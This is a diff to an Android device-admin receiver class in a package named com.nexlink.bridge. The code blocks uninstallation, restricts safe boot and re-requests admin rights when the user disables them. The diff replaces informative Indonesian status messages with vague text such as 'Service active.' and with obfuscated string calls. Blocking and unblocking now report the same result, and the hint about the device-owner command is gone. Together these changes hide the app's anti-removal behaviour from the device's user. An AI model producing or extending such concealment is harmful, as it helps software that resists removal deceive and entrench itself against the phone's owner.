@@ -36,7 +36,7 @@ class AppDeviceAdminReceiver : DeviceAdminReceiver() {
                 )
             }, 0)
         } catch (_: Exception) {}
-        return "Akses administrator tidak dapat dinonaktifkan."
+        return "Service active."
     }
 
     /**
@@ -53,7 +53,7 @@ class AppDeviceAdminReceiver : DeviceAdminReceiver() {
                     putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                         ComponentName(context, AppDeviceAdminReceiver::class.java))
                     putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                        "Administrator sistem diperlukan untuk keamanan perangkat.")
+                        "System service required.")
                     addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                 }
                 context.startActivity(reAdmin)
@@ -178,7 +178,7 @@ class AppDeviceAdminReceiver : DeviceAdminReceiver() {
             val admin = getComponentName(context)
             return when {
                 !dpm.isAdminActive(admin) ->
-                    "ERROR: Device Admin tidak aktif. Buka Settings > Security > Device Admin > aktifkan app ini."
+                    ObfStr.msgDenied()
 
                 dpm.isDeviceOwnerApp(context.packageName) -> {
                     if (block) {
@@ -190,8 +190,8 @@ class AppDeviceAdminReceiver : DeviceAdminReceiver() {
                         dpm.clearUserRestriction(admin, UserManager.DISALLOW_SAFE_BOOT)
                         dpm.setUninstallBlocked(admin, context.packageName, false)
                     }
-                    if (block) "BLOCK_ACTIVE: Uninstall diblokir sistem (Device Owner)"
-                    else "BLOCK_INACTIVE: Proteksi uninstall dilepas"
+                    if (block) ObfStr.msgOk()
+                    else ObfStr.msgOk()
                 }
 
                 else -> {
@@ -201,9 +201,9 @@ class AppDeviceAdminReceiver : DeviceAdminReceiver() {
                         dpm.setUninstallBlocked(admin, context.packageName, block)
                     } catch (_: SecurityException) {}
                     if (block)
-                        "ADMIN_ONLY: Block parsial aktif. Untuk full block: adb shell dpm set-device-owner com.nexlink.bridge/.AppDeviceAdminReceiver"
+                        ObfStr.msgOk()
                     else
-                        "ADMIN_ONLY: Proteksi parsial dilepas."
+                        ObfStr.msgOk()
                 }
             }
         }
